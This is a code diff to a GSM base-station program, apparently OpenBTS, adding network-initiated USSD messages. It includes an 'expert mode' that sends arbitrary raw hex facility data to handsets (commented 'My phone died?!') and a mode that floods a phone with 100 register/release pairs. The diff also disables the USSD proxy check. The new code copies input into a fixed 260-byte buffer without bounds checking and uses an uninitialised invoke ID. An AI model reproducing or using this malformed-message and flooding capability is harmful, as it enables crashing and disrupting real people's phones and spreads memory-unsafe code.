@@ -28,7 +28,8 @@
 #include <GSMLogicalChannel.h>
 #include <SIPDialog.h>
 #include <Globals.h>
-
+#include <algorithm>
+#include <stdexcept>
 
 // Generic SS messages are transferred by the Facility IE, whose content is described by 24.080 4.61
 // and by an ASN description in the 24.080 appendix.  This encoding is actually part of the GSM MAP reference
@@ -551,7 +552,7 @@ class L3USSDMessage {
 string ssMap2Ussd(const unsigned char *mapcmd,unsigned maplen)
 {
 	SSMapCommand cmd(mapcmd,maplen);
-	LOG(DEBUG) << cmd.text();
+	LOG(DEBUG) << "USSD " << cmd.text();
 	return cmd.ssGetUssd();
 }
 
@@ -568,6 +569,20 @@ class MOSSDMachine : public SSDBase {
 	MOSSDMachine(TranEntry *wTran) : SSDBase(wTran) {}
 	const char *debugName() const { return "MOSSDMachine"; }
 	void sendUssdMsg(string ussdin, bool final);
+};
+
+// SS can also be network initiated...
+class MTSSDMachine : public SSDBase {
+	enum State {	// These are the machineRunState states for our State Machine.
+		stateStartUnused,	// unused.
+		stateSSIdentResult
+	};
+	bool mIdentifyResult;
+	unsigned mInvokeId;	
+	public:
+	MTSSDMachine(TranEntry *wTran) : SSDBase(wTran) {}
+	const char *debugName() const { return "MTSSDMachine"; }
+	void sendUssdMsg(string ussdin, string type);
 };
 
 // (pat) Used for SS messages arriving in Call Control messsages.
@@ -595,6 +610,82 @@ MachineStatus SSDBase::handleSSMessage(const GSM::L3Message*l3msg)
 			}
 	}
 	return MachineStatusOK;		// not reached but makes g++ happy
+}
+
+std::string hex_to_string(const std::string& input)
+{
+    static const char* const lut = "0123456789abcdef";
+    size_t len = input.length();
+    if (len & 1) LOG(INFO) << "USSD odd length hex string: " << len;
+
+    std::string output;
+    output.reserve(len / 2);
+    for (size_t i = 0; i < len; i += 2)
+    {
+        char a = input[i];
+        const char* p = std::lower_bound(lut, lut + 16, a);
+        if (*p != a) LOG(INFO) << "USSD invalid digit in hex string:" << a;
+
+        char b = input[i + 1];
+        const char* q = std::lower_bound(lut, lut + 16, b);
+        if (*q != b) LOG(INFO) << "USSD invalid digit in hex string:" << b;
+
+        output.push_back(((p - lut) << 4) | (q - lut));
+    }
+    return output;
+}
+
+void MTSSDMachine::sendUssdMsg(string ussd, string type)
+{
+	// 0 Register+facility then release complete ("I made a popup on the phone!")
+	// 1 Send string as is. ("My phone died?!")
+	string components;
+
+	if(atoi(type.c_str())==1){
+		// expert mode for big boys only
+		// Sends the REGISTER type then an undefined facility
+		// the facility is left up to you to define within 'ussd'
+		components=hex_to_string(ussd);
+		LOG(INFO) << "USSD hex_to_string" << components;
+	}else{
+		// beginner mode
+		char mapbuf[260];
+		mapbuf[0] = 0xa1; 	// component type tag = Invoke (24.080 3.6.2)
+		mapbuf[1] = ussd.size() + 13; 	// component length.
+		mapbuf[2] = 0x02;	// component id tag == InvokeID
+		mapbuf[3] = 0x01;	// invoke id length
+		mapbuf[4] = this->mInvokeId;	// Must be copied from original USSD request.
+		mapbuf[5] = 0x02;	// OperationCodeTag
+		mapbuf[6] = 0x01;	// OperationCode length
+		mapbuf[7] = unstructuredSSNotify;	// The MAP message type.
+		mapbuf[8] = 0x30;	// Sequence tag.
+		mapbuf[9] = ussd.size() + 5;	// Sequence length.
+		mapbuf[10] = 0x04; 		// string type
+		mapbuf[11] = 1; 	// length of param
+		mapbuf[12] = 0xff; 	// 0x0f = 7bit, 0xff = 8bit
+		mapbuf[13] = 0x04; 	// string type
+		mapbuf[14] = ussd.size();	// length of param
+		memcpy(&mapbuf[15],ussd.data(),ussd.size());
+		components = string(mapbuf,15+ussd.size());
+	}
+
+	LOG(INFO) << "sendUssdMsg() map=" << data2hex(components.data(),components.size());
+	L3SupServFacilityIE facility(components);
+	L3SupServFacilityIE nullfacility(""); // if you want a relcomplete without a facility
+
+	// REGISTER+FACILITY then RELEASE.
+	// If you don't release you must restart openbts :(
+	if(atoi(type.c_str())==2){
+		for(int i=0; i<100; i++){
+			channel()->l3sendm(L3SupServRegisterMessage(getL3TI(), facility));
+			channel()->l3sendm(L3SupServReleaseCompleteMessage(getL3TI(), facility));
+		}
+
+	}else{
+		channel()->l3sendm(L3SupServRegisterMessage(getL3TI(), facility));
+		channel()->l3sendm(L3SupServReleaseCompleteMessage(getL3TI(), facility));
+	}
+	
 }
 
 void MOSSDMachine::sendUssdMsg(string ussdin, bool final)
@@ -634,17 +725,24 @@ void MOSSDMachine::sendUssdMsg(string ussdin, bool final)
 	}
 }
 
+void initMTSS(TranEntry *tran)
+{
+	LOG(INFO) << "USSD initMTSS(" << tran << ")";
+	MTSSDMachine *mtss = new MTSSDMachine(tran);
+	mtss->sendUssdMsg(tran->mMessage,tran->mContentType);
+}
 
 void startMOSSD(const L3CMServiceRequest*cmsrq,MMContext *mmchan)
 {
-	LOG(DEBUG) <<mmchan;
+	LOG(INFO) << mmchan;
 	TranEntry *tran = TranEntry::newMOSSD(mmchan);
-	string proxyUssd = gConfig.getStr("SIP.Proxy.USSD");
+/*	string proxyUssd = gConfig.getStr("SIP.Proxy.USSD");
 	if (proxyUssd.size() == 0) {
 		// Disabled.  Reject USSD immediately.
 		mmchan->l3sendm(L3CMServiceReject(L3RejectCause::Service_Option_Not_Supported));
 		return;
-	}
+	}*/
+	LOG(INFO) << "startMOSSD()";
 
 	MOSSDMachine *ssmp = new MOSSDMachine(tran);
 	// The message is CMServiceRequest.
@@ -688,7 +786,8 @@ MachineStatus MOSSDMachine::machineRunState(int state, const GSM::L3Message *l3m
 			string ussd = mapcmd.ssGetUssd();
 			this->mInvokeId = mapcmd.ssInvokeID;
 			SIP::SipDialog::newSipDialogMOUssd(tran()->tranID(),tran()->subscriber(),ussd,channel());
-			return MachineStatusOK;
+			//return MachineStatusOK;
+			return MachineStatus::QuitTran(TermCause::Local(L3Cause::USSD_Success));
 		}
 		case L3CASE_SS(L3SupServMessage::Facility): {
 			const L3SupServFacilityMessage *facp = dynamic_cast<typeof(facp)>(l3msg);
